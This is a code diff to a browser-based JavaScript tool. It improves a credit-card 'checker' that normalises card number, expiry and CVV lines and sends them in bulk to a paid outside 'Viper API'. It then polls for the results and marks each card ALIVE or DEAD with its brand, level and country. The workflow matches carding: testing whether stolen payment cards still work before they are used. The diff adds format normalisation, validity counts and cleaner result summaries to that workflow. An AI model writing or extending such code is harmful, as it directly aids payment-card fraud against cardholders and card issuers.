@@ -4288,6 +4288,7 @@ function addCollectedToCards() {
 
     async function viperRequest(path, method = 'GET', body = null) {
         const token = document.getElementById('checker-token')?.value || localStorage.getItem('viper_token') || '';
+        if (!token) throw new Error('No API token set');
         const opts = {
             method,
             headers: {
@@ -4305,6 +4306,23 @@ function addCollectedToCards() {
         return data;
     }
 
+    // Normalize any card line to CCN|MM|YY|CVV format
+    function normalizeCardLine(line) {
+        const cleaned = line.trim();
+        if (!cleaned) return null;
+        // Match: 13-19 digit card, then month (1-12), then year (2 or 4 digit), then CVV (3-4 digit)
+        // Separators can be any non-alphanumeric char(s)
+        const m = cleaned.match(/(\d[\d\s\-]{11,22}\d)\D+(0?[1-9]|1[012])\D+(\d{2}|\d{4})\D+(\d{3,4})/);
+        if (!m) return null;
+        const ccn = m[1].replace(/[\s\-]/g, '');
+        if (ccn.length < 13 || ccn.length > 19) return null;
+        const mm = m[2].padStart(2, '0');
+        let yy = m[3];
+        if (yy.length === 4) yy = yy.slice(2); // 2029 → 29
+        const cvv = m[4];
+        return `${ccn}|${mm}|${yy}|${cvv}`;
+    }
+
     function openChecker() {
         const overlay = document.getElementById('checker-overlay');
         overlay.classList.remove('hidden');
@@ -4314,21 +4332,24 @@ function addCollectedToCards() {
         const tokenInput = document.getElementById('checker-token');
         if (savedToken && tokenInput) tokenInput.value = savedToken;
 
-        // Auto-load cards from Notes in checker format
-        const notesText = STATE.notes || '';
-        const cardRegex = /(\d{16})\s+(0?[1-9]|1[012])\s+(\d{2}|\d{4})\s+(\d{3})/g;
-        const matches = [];
-        let m;
-        while ((m = cardRegex.exec(notesText)) !== null) {
-            matches.push(m[0]);
-        }
+        // Auto-load selected cards (or all current workspace cards)
         const inputArea = document.getElementById('checker-input');
-        if (inputArea && matches.length) {
-            inputArea.value = matches.join('\n');
-            updateCheckerInputCount();
+        if (inputArea && !inputArea.value.trim()) {
+            const cards = getFilteredCards();
+            const checkerLines = cards
+                .filter(c => c.cardNumber && (c.month || c.mm) && c.cvv)
+                .map(c => {
+                    const mm = (c.month || c.mm || '').padStart(2, '0');
+                    const yy = c.year || c.yy || '';
+                    return `${c.cardNumber}|${mm}|${yy}|${c.cvv}`;
+                });
+            if (checkerLines.length) {
+                inputArea.value = checkerLines.join('\n');
+                updateCheckerInputCount();
+            }
         }
 
-        // Bind events (use onclick to avoid duplicate listeners)
+        // Bind events
         document.getElementById('checker-close').onclick = closeChecker;
         overlay.onclick = (e) => { if (e.target === overlay) closeChecker(); };
         document.getElementById('checker-balance-btn').onclick = fetchBalance;
@@ -4352,7 +4373,9 @@ function addCollectedToCards() {
         const count = document.getElementById('checker-input-count');
         if (!input || !count) return;
         const lines = input.value.trim().split('\n').filter(l => l.trim());
-        count.textContent = lines.length + ' cards';
+        const valid = lines.filter(l => normalizeCardLine(l)).length;
+        count.textContent = valid + '/' + lines.length + ' valid';
+        count.style.color = valid === lines.length ? '#22C55E' : '#F59E0B';
     }
 
     async function fetchBalance() {
@@ -4392,9 +4415,23 @@ function addCollectedToCards() {
         const status = document.getElementById('checker-status');
         const checkBtn = document.getElementById('checker-check-btn');
 
-        const lines = (input?.value || '').trim().split('\n').filter(l => l.trim());
-        if (!lines.length) {
+        const rawLines = (input?.value || '').trim().split('\n').filter(l => l.trim());
+        if (!rawLines.length) {
             toast('No cards to check', 'error');
+            return;
+        }
+
+        // Normalize ALL lines to CCN|MM|YY|CVV
+        const normalized = [];
+        const invalid = [];
+        rawLines.forEach(line => {
+            const n = normalizeCardLine(line);
+            if (n) normalized.push(n);
+            else invalid.push(line.trim());
+        });
+
+        if (!normalized.length) {
+            toast('No valid cards found. Format: CCN MM YY CVV', 'error');
             return;
         }
 
@@ -4404,24 +4441,36 @@ function addCollectedToCards() {
         status.textContent = 'CHECKING...';
         status.className = 'checker-status-badge checking';
         checkBtn.disabled = true;
-        output.textContent = 'Sending cards to Viper API...';
+        output.textContent = `Sending ${normalized.length} cards to Viper API...`;
+        if (invalid.length) {
+            output.textContent += `\n⚠️ ${invalid.length} line(s) skipped (invalid format)`;
+        }
 
         try {
-            // Use v2 API with polling
+            // Send check v2
             const checkData = await viperRequest('/check/v2', 'POST', {
-                data: lines,
+                data: normalized,
                 check_type: method
             });
 
             const purchaseId = checkData.purchase_id;
 
-            // Show invalid items immediately
+            // Show invalid items immediately (cards that API rejected)
             let results = [];
             if (checkData.invalid_items && checkData.invalid_items.length) {
                 results = [...checkData.invalid_items];
                 output.textContent = formatCheckerResults(results) + '\n\n⏳ Polling for remaining results...';
-            } else {
+            } else if (purchaseId) {
                 output.textContent = '⏳ Waiting for results (purchase: ' + purchaseId + ')...';
+            }
+
+            if (!purchaseId) {
+                // No purchase ID — results should be immediate (v1 fallback or error)
+                status.textContent = 'DONE';
+                status.className = 'checker-status-badge done';
+                checkBtn.disabled = false;
+                if (results.length) output.textContent = formatCheckerResults(results);
+                return;
             }
 
             // Poll for results
@@ -4434,8 +4483,9 @@ function addCollectedToCards() {
                 try {
                     const pollData = await viperRequest('/check/poll/' + purchaseId, 'GET');
 
+                    // Replace results (not accumulate) — poll returns full result set
                     if (pollData.result && pollData.result.length) {
-                        results = [...results, ...pollData.result];
+                        results = [...(checkData.invalid_items || []), ...pollData.result];
                     }
 
                     if (pollData.status === 'confirmed' || attempts >= maxAttempts) {
@@ -4444,6 +4494,9 @@ function addCollectedToCards() {
                         status.className = 'checker-status-badge done';
                         checkBtn.disabled = false;
                         output.textContent = formatCheckerResults(results);
+                        if (attempts >= maxAttempts && pollData.status !== 'confirmed') {
+                            output.textContent += '\n\n⚠️ Timed out waiting for some results';
+                        }
                         return;
                     }
 
@@ -4471,25 +4524,33 @@ function addCollectedToCards() {
     function formatCheckerResults(results) {
         if (!results.length) return 'No results yet...';
 
-        return results.map(r => {
+        const alive = results.filter(r => (r.status || '').toUpperCase() === 'ALIVE').length;
+        const dead = results.filter(r => (r.status || '').toUpperCase() === 'DEAD').length;
+        const other = results.length - alive - dead;
+
+        let header = `═══ Results: ${results.length} total | ✅ ${alive} ALIVE | 💀 ${dead} DEAD`;
+        if (other) header += ` | ⚠️ ${other} other`;
+        header += ' ═══\n\n';
+
+        return header + results.map(r => {
             const isAlive = (r.status || '').toUpperCase() === 'ALIVE';
             const isDead = (r.status || '').toUpperCase() === 'DEAD';
             const icon = isAlive ? '✅' : isDead ? '💀' : '⚠️';
             const statusText = (r.status || 'UNKNOWN').toUpperCase();
 
-            let line = `${icon} ${r.card} - ${statusText}`;
+            let line = `${icon} ${r.card} — ${statusText}`;
             const details = [];
-            if (r.details) details.push('Status code - ' + r.details);
-            if (r.brand) details.push('Система - ' + r.brand);
-            if (r.type) details.push('Type - ' + r.type);
-            if (r.level) details.push('Level - ' + r.level);
-            if (r.country) details.push('Country - ' + r.country);
+            if (r.details) details.push(r.details);
+            if (r.brand) details.push(r.brand);
+            if (r.type) details.push(r.type);
+            if (r.level) details.push(r.level);
+            if (r.country) details.push(r.country);
 
             if (details.length) {
-                line += '\n' + details.map(d => '├ ' + d).join('\n');
+                line += ' [' + details.join(' • ') + ']';
             }
             return line;
-        }).join('\n\n');
+        }).join('\n');
     }
 
     function copyResults() {
@@ -4498,7 +4559,6 @@ function addCollectedToCards() {
         navigator.clipboard.writeText(output.textContent).then(() => {
             toast('Results copied', 'success');
         }).catch(() => {
-            // Fallback for file:// protocol
             const range = document.createRange();
             range.selectNodeContents(output);
             const sel = window.getSelection();
